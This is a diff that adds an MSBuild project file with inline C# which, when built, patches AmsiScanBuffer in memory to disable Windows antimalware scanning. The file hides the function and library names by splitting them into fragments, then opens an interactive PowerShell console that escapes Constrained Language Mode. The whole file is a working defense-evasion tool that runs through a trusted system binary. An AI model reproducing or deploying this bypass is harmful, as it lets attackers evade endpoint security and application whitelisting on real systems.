@@ -1,0 +1,94 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Bypass">
+   <CLMBypass/>
+  </Target>
+   <UsingTask
+    TaskName="CLMBypass"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Reference Include="System.Management.Automation" />		
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+			using System;
+			using System.IO;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			using System.ComponentModel;
+			using System.Collections.Generic;
+			using System.Collections.ObjectModel;
+			using System.Runtime.InteropServices;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+      using System.Text;
+      public class CLMBypass : Task, ITask
+      {
+         [DllImport("kernel32")]
+         public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ 
+         [DllImport("kernel32")]
+         public static extern IntPtr LoadLibrary(string name);
+         [DllImport("kernel32")]
+         public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+         static int Bypass()
+         {
+            String[] val = { "Am", "si", "Sc", "an", "Buf", "fer" };
+            String sepe = "";
+            var concat = String.Join(sepe,val);
+            
+            char[] chars2 = { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' };
+            String libName = string.Join("", chars2);
+            
+            IntPtr Address = GetProcAddress(LoadLibrary(libName), concat);
+            UIntPtr size = (UIntPtr)5;
+            uint p = 0;
+            VirtualProtect(Address, size, 0x40, out p);
+            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            Marshal.Copy(Patch, 0, Address, 6);
+	      	  return 0;
+          }
+          public override bool Execute()
+          {
+              Runspace runspace = RunspaceFactory.CreateRunspace();
+              runspace.Open();
+              Bypass();
+              
+              RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
+              var command = "";
+              do
+              {
+                Console.Write("PS > ");
+                command = Console.ReadLine();
+                if (!string.IsNullOrEmpty(command))
+                {
+                    using (Pipeline pipeline = runspace.CreatePipeline())
+                    {
+                        try
+                        {
+                            pipeline.Commands.AddScript(command);
+                            pipeline.Commands.Add("Out-String");
+                            Collection<PSObject> results = pipeline.Invoke();
+                            StringBuilder stringBuilder = new StringBuilder();
+                            foreach (PSObject obj in results)
+                            {
+                                stringBuilder.AppendLine(obj.ToString());
+                            }
+                            Console.Write(stringBuilder.ToString());
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine(e.Message);
+                        }
+                        
+                    }
+                }
+              }
+             while (command != "exit");
+             return true;
+        }
+      }
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
